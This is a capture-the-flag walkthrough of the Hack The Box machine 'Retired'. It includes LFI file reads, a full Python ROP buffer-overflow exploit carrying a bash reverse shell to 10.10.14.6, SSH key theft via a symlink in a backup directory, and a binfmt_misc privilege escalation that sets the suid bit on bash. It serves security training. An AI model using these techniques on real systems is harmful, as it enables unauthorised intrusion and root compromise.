# HTB - Retired

## Summary

This is a great box. First we find an obvious LFI and use it to enumerate a process that is listening on the box's localhost. We then exploit that process with a buffer overflow/rop chain to get a foothold. Then, we move laterally using a systemctl timer service. Finally, the privesc to root involves using linux capabilities and an emulator application.

<br />

## Web Enumeration

There is a `page` parameter in the url. We can set this parameter by changing the url to `/index.php?page=index.php` and pressing `ctrl + u` to see the source of the index.php page. There are some cases where the php will be executed instead of displayed, depending on what function is being used to include pages, but that is not the case with this box. We can see the php source. The php source is written very poorly, and allows us to bypass a sanatize input check without doing anything if we just use burpsuite to send our request.  

`ffuf` finds `beta.html` which has an upload file feature. If we upload a file and intercept the upload request, we can see it is a POST request to `/activate_license.php`. We can look at that pages's source with our LFI. In the PHP source, we can see `socket_connect($socket, '127.0.0.1', 1337)`. So a socket is being opened to localhost port `1337`. We already know `1337` is not available to us from the outside because nmap did not find that port. 

We can grab the file `/proc/net/tcp` which has entries of the form:  
```
1: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 10874 1 0000000019117793 100 0 0 10 0
```
In this case `0100007F` is a backwards hex representation of `127.0.0.1`, and `0539` is the hex representation of `1337`. So this confirms something is listening on `127.0.0.1:1337` but we don't know what  

We can grab the file `/proc/sched_debug` to see a list of all the running processes. Here we see `activate_license` with pid `420`  

We can then grab `/proc/420/cmdline` to see what command the process was run with. In this case it was `/usr/bin/activate_license 1337`  

So, we can use our LFI to grab that file with curl:  
`curl http://retired.htb/index.php\?page\=../../../../../usr/bin/activate_license -o activate_license`  

Through some dynamic and static analysis, we can find that this program is vulnerable to a buffer overflow  

If we grab `/proc/sys/kernel/randomize_va_space` we can see that it is set to `2` indicating that aslr is turned on  

`checksec activate_license` tells us that RELRO is enabled, NX is enabled, PIE is enabled, but there is no stack canary  

Grabbing `/proc/420/maps` is the equivalent of running `vmmap` in GDB. This allows us to see the base addresses of everything in the running version of activate_license.  

Using this, we can see the version of libc being used is at `/usr/lib/x86_64-linux-gnu/libc-2.31.so` we can grab this with:  
`curl http://retired.htb/index.php\?page\=../../../../../usr/lib/x86_64-linux-gnu/libc-2.31.so -o target_libc`  

If this was local, we could just do a basic `system("/bin/sh")` rop chain, but we instead need to send the full reverse shell command, so we end up with the following exploit:

```python
import struct

# From /proc/pid/maps
activate_license_base = 0x55ba18a54000
libc_base = 0x7f4a1453a000
writeable_mem = 0x55ba18a58000

# ropper --file activate_license --search "pop rdi"
pop_rdi = struct.pack("<Q", activate_license_base + 0x181b)
extra_ret = 0x181c

# ropper --file target_libc --search "mov [rax]"
# 8a0eb: mov qword ptr [rax], rdi; ret
mov_rax = struct.pack("<Q", libc_base + 0x8a0eb)

# ropper --file target_libc --search "pop rax"
# 3ee88: pop rax; ret;
pop_rax = struct.pack("<Q", libc_base + 0x3ee88)

# objdump -d target_libc | grep system
libc_system = struct.pack("<Q", libc_base + 0x48e53)

cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.6/8686 0>&1'"

# Distance to stack base = 520
payload = b'a' * 520

# Write cmd to memory
for i in range(0, len(cmd), 8):
    payload += pop_rax
    payload += struct.pack("<Q", writeable_mem + i) # Put address of next 8 writable bytes into rax
    payload += pop_rdi
    payload += cmd[i:i+8].ljust(8, b'\x00') # put next 8 bytes of payload into rdi
    payload += mov_rax # mov qword ptr [rax], rdi

payload += pop_rdi
payload += struct.pack("<Q", writeable_mem)
payload += libc_system

with open('license.key', 'wb') as f:
    f.write(payload)
```

Sending the generated `license.key` file to the vulnerable service, and starting a nc listner on 8686, we get a shell back  

<br />

## Lateral Movement

`LinPeas` shows us there is a System timer (which is "like a cron but for services") `website_backup.timer` running every minute  

We can run `systemctl cat website_backup.service` to get information about it. We can see `User=dev` which means that this is timer runs as the user `dev`. We can also see `ExecStart=/usr/bin/webbackup`  

`cat /usr/bin/webbackup` shows us that this is a script which zips the contents of `/var/www/html` with the `-r` flag which means to recurse through subdirectories.  

What we can do is create a symlink in `/var/www/html` to point to `/home/dev/`  
When the zip command is run by the timer service, this will cause the contents of `/home/dev/` to be included in the zip  

Create the symlink:  
`ln -s /home/dev fake_link`  

The next time the timer runs, the zip will contain the contents of dev's home directory.  

We can grab dev's ssh key at `.ssh/id_rsa` copy it to our box, and then ssh with:  
`chmod 600 id_rsa`  
`ssh -i id_rsa dev@10.10.11.154`  

<br />

## Privesc

There is a directory in dev's home directory called `emuemu` which just contains the installation material for an emulator application called `emuemu`  
We can see in the `Makefile` that during install, the `cap_dac_override` capability is given to the file `/usr/lib/emuemu/reg_helper`  
`cap_dac_override` allows bypassing permissions checks on any file, so you can write to any file.  

We can confirm this with:  
`/usr/sbin/getcap /usr/lib/emuemu/reg_helper`  
and we see that it has the capability  

We have the `reg_helper.c` source, so we can see what it is doing:  
It just reads in a filename and writes it to `/proc/sys/fs/binfmt_misc/register`  

`binfmt_misc` is a linux kernel capability which allows arbitrary executable formats to be recognized and passed to certain user space applications.  
This gets very specific, but with the following, we can tell the kernel to run files with the extension `.AAA` using the interpreter `/tmp/privesc`  
Importantly, the privileges of the file being run are preserved when this happens. So we can:  
`echo :PRIVESC:E::AAA::/tmp/privesc:C | /usr/lib/emuemu/reg_helper`  
Create and compile the "interpreter" binary `/tmp/privesc`:
```C
// gcc /tmp/privesc.c -o /tmp/privesc
int main(){
        setuid(0);
        setgid(0);
        system("chmod u+s /bin/bash");
}
```
We can chose any suid binary to be our file that will be run using the interpreter, in this case I chose `su`  
`ln -s /usr/bin/su su.AAA`  

And then running `./su.AAA` causes `/tmp/privesc` to be run with the privileges of `su`, which adds the suid bit to `/bin/bash`   
`/bin/bash -p` gets us a root shell
